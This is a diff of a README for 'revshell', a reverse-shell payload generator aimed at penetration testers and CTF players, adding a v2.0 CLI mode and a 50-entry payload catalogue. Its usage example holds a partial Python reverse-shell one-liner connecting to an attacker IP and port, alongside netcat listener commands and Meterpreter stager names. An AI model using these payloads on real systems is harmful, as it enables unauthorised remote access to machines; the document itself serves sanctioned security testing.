@@ -1,4 +1,3 @@
-
 <div align="center">
 
 ```
@@ -24,11 +23,11 @@
 [![Python](https://img.shields.io/badge/Python-3.10%2B-3776ab?style=flat-square&logo=python&logoColor=white)](https://www.python.org/)
 [![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20macOS%20%7C%20Windows-lightgrey?style=flat-square&logo=linux)](https://github.com)
 [![License](https://img.shields.io/badge/License-MIT-22c55e?style=flat-square)](LICENSE)
-[![Version](https://img.shields.io/badge/Version-v1.2-red?style=flat-square)](https://github.com/ZetaOrioniss/revshell)
+[![Version](https://img.shields.io/badge/Version-v2.0-red?style=flat-square)](https://github.com/ZetaOrioniss/revshell)
 [![Payloads](https://img.shields.io/badge/Payloads-Invicti-ef4444?style=flat-square)](https://www.invicti.com)
 [![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen?style=flat-square)](https://github.com/ZetaOrioniss/revshell/pulls)
 
-[Features](#-features) · [Why revshell?](#-why-revshell) · [Install](#-installation) · [Usage](#-usage) · [Commands](#-commands) · [Interfaces](#-network-interface-picker) · [Payloads](#-available-payloads) · [FAQ](#-faq)
+[Features](#-features) · [Why revshell?](#-why-revshell) · [Install](#-installation) · [Usage](#-usage) · [CLI Arguments](#-cli-arguments) · [Commands](#-commands) · [Interfaces](#-network-interface-picker) · [Payloads](#-available-payloads) · [FAQ](#-faq)
 
 </div>
 
@@ -38,13 +37,14 @@
 
 **revshell** is an interactive terminal console for generating reverse shell payloads, built for penetration testers and CTF players. Inspired by the `msfconsole` workflow, it lets you configure your LHOST and LPORT once — then generate any payload instantly, start a real listener, and manage everything from a single persistent session.
 
-Version 1.1 adds **network interface awareness**: instead of looking up your IP manually, you can set LHOST directly from an interface name (`set ip tun0`) or use the interactive picker (`ifconfig pick`) to select it from a numbered list.
+v2.0 adds a full **CLI argument interface**: every action the console exposes can now be triggered non-interactively from the command line — generate a payload and pipe it directly to `xclip`, filter by category, start a listener, or just list keys, all without entering the REPL.
 
 ```
-revshell (10.10.14.5:4444) > use python
+revshell (10.10.14.5:4444) > use python3_pty
 
   ────────────────────────────────────────────────────────────────────────────
-  🐧 Python  (unix)
+  🐧 Python3 PTY  python3_pty  (unix/python)
+  Spawns a PTY
   ────────────────────────────────────────────────────────────────────────────
 
   python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.14.5",4444));
@@ -64,12 +64,15 @@ revshell (10.10.14.5:4444) > use python
 | 🌐 | **Interface-aware LHOST** | Set LHOST from an interface name (`tun0`, `eth0`) — IP is resolved automatically |
 | 🖱️ | **Interactive interface picker** | `ifconfig pick` displays a numbered list — select by number or name |
 | ⚠️ | **Visual placeholders** | Unset values appear in red `<LHOST>` / `<LPORT>` — no more broken payloads |
-| 🔀 | **12 payloads** | Bash, Bash 196, Python, Perl, PHP, Netcat, Netcat mkfifo, Ruby, Socat, AWK, PowerShell, PS Base64 |
+| 🔀 | **50+ payloads** | Bash, Python, Perl, PHP, Ruby, Netcat, Socat, AWK, Go, Lua, Node.js, PowerShell, Meterpreter stagers |
 | 🐧🪟 | **Platform filtering** | `run --unix` / `run --windows` to filter by OS |
+| 🗂️ | **Category filtering** | `run --cat python` to show only a specific language |
 | 📡 | **Real listener** | `listener` and `rlwrap` start an actual `nc -lvnp` session from inside the console |
+| ⚡ | **CLI one-shot mode** | Pass `-H`, `-P`, `-u`, `--all`, `--list`, `--listen`… to run without entering the REPL |
+| 📋 | **Pipe-friendly `--raw`** | `--raw` outputs the bare command with no colors — perfect for piping to `xclip` or `pbcopy` |
 | 🔍 | **Netcat auto-detection** | Checks for `nc`, `ncat`, `netcat` — gives clear install hint if missing |
 | 💾 | **Persistent config** | LHOST and LPORT saved to `conf.json` — reload anytime with `load config` |
-| ⌨️ | **Tab completion** | Commands, keys, payload names, and **interface names** all autocomplete |
+| ⌨️ | **Tab completion** | Commands, keys, payload names, and interface names all autocomplete |
 | ⬆️ | **Command history** | Navigate previous commands with arrow keys |
 | 📦 | **Zero dependencies** | Pure Python standard library — nothing to install beyond Python 3.10 |
 
@@ -87,6 +90,8 @@ The typical CTF flow for getting a reverse shell looks like this:
 
 **revshell collapses all of that into one place.** Type `ifconfig pick`, select `tun0`, and your LHOST is set. Every payload is pre-filled. Your listener starts in the same window with a single command. The config persists across sessions.
 
+With v2.0 you don't even need to enter the console — a single command in your terminal gets you the payload, ready to paste or pipe.
+
 ### Compared to alternatives
 
 | | revshell | revshells.com | msfconsole | grep from notes |
@@ -97,6 +102,8 @@ The typical CTF flow for getting a reverse shell looks like this:
 | Real listener built-in | ✅ | ❌ | ✅ | ❌ |
 | Persistent config | ✅ | ❌ | ✅ | ❌ |
 | Tab completion | ✅ | ❌ | ✅ | ❌ |
+| CLI non-interactive mode | ✅ | ❌ | ❌ | ❌ |
+| Pipe-friendly raw output | ✅ | ❌ | ❌ | ❌ |
 | Lightweight / single file | ✅ | ✅ | ❌ | ✅ |
 
 ---
@@ -129,7 +136,8 @@ sudo apt install rlwrap           # upgraded TTY on listener
 ## 🚀 Usage
 
 ```bash
-python3 revshell.py
+python3 revshell.py              # interactive console
+python3 revshell.py --help       # CLI argument reference
 ```
 
 ### Typical CTF workflow
@@ -142,22 +150,103 @@ revshell (-:-) > set ip tun0
 # Option B — interactive picker
 revshell (-:-) > ifconfig pick
   #   INTERFACE    IPv4
-  1.  lo           127.0.0.1
-  2.  eth0         192.168.1.42
-  3.  tun0         10.10.14.5
-  > 3
+  1.  eth0         192.168.1.42
+  2.  tun0         10.10.14.5
+  > 2
   LHOST => 10.10.14.5  (tun0)
 
 # Set port and generate payloads
 revshell (10.10.14.5:-) > set port 4444
 revshell (10.10.14.5:4444) > run              ← all payloads
-revshell (10.10.14.5:4444) > use bash         ← one payload
+revshell (10.10.14.5:4444) > use bash_tcp     ← one payload
 revshell (10.10.14.5:4444) > run --windows    ← Windows only
+revshell (10.10.14.5:4444) > run --cat python ← Python only
 revshell (10.10.14.5:4444) > listener         ← nc -lvnp 4444
 revshell (10.10.14.5:4444) > rlwrap           ← rlwrap nc -lvnp 4444
 
 # Save and reload config
 revshell (10.10.14.5:4444) > load config      ← restore from conf.json
+```
+
+---
+
+## ⚡ CLI Arguments
+
+v2.0 adds a complete non-interactive CLI. Any action available in the console can now be run from a single command, with no REPL required.
+
+```
+usage: revshell [-h] [-H LHOST] [-P LPORT] [-u KEY] [--all] [--list] [--raw]
+                [--unix] [--windows] [--cat CATEGORY] [--listen] [--rlwrap]
+                [--ifconfig] [--no-banner]
+```
+
+### Connection
+
+| Argument | Description |
+|---|---|
+| `-H`, `--host LHOST` | Attacker IP or interface name (e.g. `10.10.14.5`, `tun0`, `eth0`) |
+| `-P`, `--port LPORT` | Listener port (e.g. `4444`) |
+
+When used without a non-interactive flag, `-H` and `-P` pre-seed the console session — you land in the REPL with LHOST and LPORT already set.
+
+### One-shot output
+
+| Argument | Description |
+|---|---|
+| `-u`, `--use KEY` | Print a single payload by key and exit |
+| `--all` | Print all payloads and exit (respects `--unix`/`--windows`/`--cat`) |
+| `--list` | List all payload keys and names in table view and exit |
+| `--raw` | With `-u`: output bare command only — no colors, no decoration. Pipe-friendly. |
+
+### Filters
+
+| Argument | Description |
+|---|---|
+| `--unix` | Show Unix/Linux payloads only |
+| `--windows` | Show Windows payloads only |
+| `--cat CATEGORY` | Filter by category: `bash`, `python`, `perl`, `php`, `ruby`, `netcat`, `socat`, `other`, `powershell`, `meterpreter` |
+
+### Listener
+
+| Argument | Description |
+|---|---|
+| `--listen` | Start `nc -lvnp <LPORT>` and exit (requires `-P`) |
+| `--rlwrap` | Start `rlwrap nc -lvnp <LPORT>` and exit (requires `-P`) |
+
+### Misc
+
+| Argument | Description |
+|---|---|
+| `--ifconfig` | List IPv4 interfaces and exit |
+| `--no-banner` | Suppress the banner when launching the interactive console |
+
+### Examples
+
+```bash
+# Print one payload and exit
+revshell.py -H 10.10.14.5 -P 4444 -u bash_tcp
+
+# Copy a payload directly to clipboard — no terminal noise
+revshell.py -H 10.10.14.5 -P 4444 -u socat --raw | xclip -sel clip
+
+# Print all Unix Python payloads
+revshell.py -H 10.10.14.5 -P 4444 --all --unix --cat python
+
+# List all available payload keys
+revshell.py --list
+
+# List netcat payloads only
+revshell.py --list --cat netcat
+
+# Resolve an interface name to IP, print a payload, and exit
+revshell.py -H tun0 -P 4444 -u socat --raw
+
+# Start a listener directly
+revshell.py -P 4444 --listen
+revshell.py -P 4444 --rlwrap
+
+# Launch the console with LHOST/LPORT pre-configured, no banner
+revshell.py -H 10.10.14.5 -P 4444 --no-banner
 ```
 
 ---
@@ -188,11 +277,13 @@ revshell (10.10.14.5:4444) > load config      ← restore from conf.json
 | Command | Description |
 |---|---|
 | `show` | List all payload keys and platforms |
-| `use <name>` | Display a single payload (e.g. `use python`) |
+| `show <category>` | Filter list by category (e.g. `show python`) |
+| `use <key>` | Display a single payload (e.g. `use bash_tcp`) |
 | `run` / `generate` | Display all payloads with current config |
-| `run <name>` | Display a specific payload |
+| `run <key>` | Display a specific payload |
 | `run --unix` / `-u` | Show Unix payloads only |
 | `run --windows` / `-w` | Show Windows payloads only |
+| `run --cat <name>` | Show payloads for a specific category |
 
 ### Listener
 
@@ -200,6 +291,13 @@ revshell (10.10.14.5:4444) > load config      ← restore from conf.json
 |---|---|
 | `listener` | Start `nc -lvnp <LPORT>` — binary auto-detected |
 | `rlwrap` | Start `rlwrap nc -lvnp <LPORT>` for upgraded TTY |
+
+### Shell
+
+| Command | Description |
+|---|---|
+| `! <command>` | Execute a native system command from inside the console |
+| `shell` | Drop into an interactive `/bin/bash` subshell |
 
 ### Other
 
@@ -213,7 +311,7 @@ revshell (10.10.14.5:4444) > load config      ← restore from conf.json
 
 ## 🌐 Network Interface Picker
 
-One of the most tedious parts of a CTF is finding your VPN IP before generating payloads. revshell v1.1 solves this with three methods:
+One of the most tedious parts of a CTF is finding your VPN IP before generating payloads. revshell solves this with three methods:
 
 **Method 1 — set directly from interface name:**
 ```
@@ -249,6 +347,12 @@ revshell (-:-) > ifconfig
   Tip: set ip <iface> to set LHOST from an interface name
 ```
 
+**Method 4 — from the CLI directly (v2.0):**
+```bash
+revshell.py -H tun0 -P 4444 -u bash_tcp --raw
+# → resolves tun0 to 10.10.14.5 and prints the payload
+```
+
 IP resolution uses three fallback methods internally (`fcntl` ioctl → `ip -4 addr` → `ifconfig`) to work across Linux distributions and macOS.
 
 ---
@@ -277,20 +381,56 @@ revshell (-:-) > load config
 
 ## 🔀 Available Payloads
 
-| Key | Name | Platform |
-|---|---|---|
-| `bash` | Bash | 🐧 Unix |
-| `bash_196` | Bash 196 | 🐧 Unix |
-| `python` | Python 3 | 🐧 Unix |
-| `perl` | Perl | 🐧 Unix |
-| `php` | PHP | 🐧 Unix |
-| `nc` | Netcat | 🐧 Unix |
-| `nc_mkfifo` | Netcat mkfifo | 🐧 Unix |
-| `ruby` | Ruby | 🐧 Unix |
-| `socat` | Socat | 🐧 Unix |
-| `awk` | AWK | 🐧 Unix |
-| `powershell` | PowerShell | 🪟 Windows |
-| `ps_b64` | PowerShell Base64 | 🪟 Windows |
+| Key | Name | Platform | Category |
+|---|---|---|---|
+| `bash_tcp` | Bash TCP | 🐧 Unix | bash |
+| `bash_196` | Bash FD 196 | 🐧 Unix | bash |
+| `bash_udp` | Bash UDP | 🐧 Unix | bash |
+| `bash_read` | Bash read loop | 🐧 Unix | bash |
+| `sh_tcp` | sh TCP | 🐧 Unix | bash |
+| `zsh_tcp` | Zsh TCP | 🐧 Unix | bash |
+| `python3_pty` | Python3 PTY | 🐧 Unix | python |
+| `python3_env` | Python3 environ | 🐧 Unix | python |
+| `python3_thread` | Python3 threaded | 🐧 Unix | python |
+| `python2` | Python2 | 🐧 Unix | python |
+| `python_win` | Python Windows | 🪟 Windows | python |
+| `perl` | Perl | 🐧 Unix | perl |
+| `perl_no_sh` | Perl no /bin/sh | 🐧 Unix | perl |
+| `perl_win` | Perl Windows | 🪟 Windows | perl |
+| `php_exec` | PHP exec | 🐧 Unix | php |
+| `php_proc_open` | PHP proc_open | 🐧 Unix | php |
+| `php_shell_exec` | PHP shell_exec | 🐧 Unix | php |
+| `php_system` | PHP system() | 🐧 Unix | php |
+| `php_passthru` | PHP passthru() | 🐧 Unix | php |
+| `php_win` | PHP Windows | 🪟 Windows | php |
+| `ruby` | Ruby | 🐧 Unix | ruby |
+| `ruby_no_sh` | Ruby no /bin/sh | 🐧 Unix | ruby |
+| `ruby_win` | Ruby Windows | 🪟 Windows | ruby |
+| `nc_e` | Netcat -e | 🐧 Unix | netcat |
+| `nc_mkfifo` | Netcat mkfifo | 🐧 Unix | netcat |
+| `nc_ncat` | Ncat | 🐧 Unix | netcat |
+| `nc_udp` | Netcat UDP | 🐧 Unix | netcat |
+| `busybox_nc` | BusyBox nc | 🐧 Unix | netcat |
+| `socat` | Socat | 🐧 Unix | socat |
+| `socat_tty` | Socat encrypted | 🐧 Unix | socat |
+| `socat_udp` | Socat UDP | 🐧 Unix | socat |
+| `awk` | AWK | 🐧 Unix | other |
+| `gawk` | GNU Awk | 🐧 Unix | other |
+| `telnet` | Telnet mkfifo | 🐧 Unix | other |
+| `lua` | Lua | 🐧 Unix | other |
+| `golang` | Go | 🐧 Unix | other |
+| `java_runtime` | Java Runtime | 🐧 Unix | other |
+| `node_js` | Node.js | 🐧 Unix | other |
+| `powershell` | PowerShell TCP | 🪟 Windows | powershell |
+| `ps_oneliner` | PowerShell one-liner | 🪟 Windows | powershell |
+| `ps_b64` | PowerShell Base64 | 🪟 Windows | powershell |
+| `ps_icm` | PowerShell ICM | 🪟 Windows | powershell |
+| `ps_nishang` | Nishang Invoke-PowerShellTcp | 🪟 Windows | powershell |
+| `cmd_nc` | cmd.exe + nc | 🪟 Windows | powershell |
+| `msf_linux_x64` | MSF Linux x64 | 🐧 Unix | meterpreter |
+| `msf_win_x64` | MSF Windows x64 | 🪟 Windows | meterpreter |
+| `msf_ps_stager` | MSF PS stager | 🪟 Windows | meterpreter |
+| `msf_handler` | MSF handler | 🌐 Both | meterpreter |
 
 Payloads sourced from [Invicti](https://www.invicti.com).
 
@@ -299,7 +439,7 @@ Payloads sourced from [Invicti](https://www.invicti.com).
 ## ❓ FAQ
 
 **Can I use an interface name instead of an IP?**
-Yes — `set ip tun0` resolves the interface's IPv4 address automatically. Interface names also autocomplete with Tab.
+Yes — `set ip tun0` resolves the interface's IPv4 address automatically. Interface names also autocomplete with Tab. The CLI also accepts interface names via `-H tun0`.
 
 **What if my interface has no IPv4 (e.g. IPv6 only)?**
 revshell will tell you the interface was not found or has no IPv4 address, and suggest running `ifconfig` to check.
@@ -314,7 +454,13 @@ The `listener` and `rlwrap` commands will tell you which package to install (`su
 The core logic works on Windows with Python 3.10+. The interface picker relies on Linux/macOS system calls and will fall back gracefully, though results may be incomplete. `readline` may require `pyreadline3` on Windows (`pip install pyreadline3`).
 
 **Does it save my payloads?**
-It saves LHOST and LPORT to `conf.json`. Individual payloads are generated on the fly — copy them directly from the terminal output.
+It saves LHOST and LPORT to `conf.json`. Individual payloads are generated on the fly — copy them directly from the terminal output, or use `--raw` to pipe them anywhere.
+
+**How do I copy a payload to clipboard without entering the console?**
+```bash
+revshell.py -H tun0 -P 4444 -u bash_tcp --raw | xclip -sel clip   # Linux
+revshell.py -H tun0 -P 4444 -u bash_tcp --raw | pbcopy             # macOS
+```
 
 ---
 
